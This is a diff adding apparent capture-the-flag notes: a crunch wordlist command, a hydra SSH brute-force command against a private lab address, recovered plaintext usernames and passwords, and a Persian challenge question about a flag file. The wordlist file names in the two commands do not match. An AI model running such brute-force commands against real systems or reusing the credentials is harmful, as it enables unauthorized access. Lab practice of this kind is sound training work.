@@ -15,3 +15,15 @@
 
 
 [information password]=(Ab123456)
+
+crunch 7 7 -t saba%%%  -o 7chars.txt
+
+hydra -l semiroot -P 8chars.txt ssh://192.168.8.40
+
+semiroot saba123
+
+tc Warm123321#$%(
+
+1-محتوای فایل فلگ موجود در پروفایل کاربر tc را وارد نمایید.
+
+**Warmup-Prive-1-Challenginno-lin**
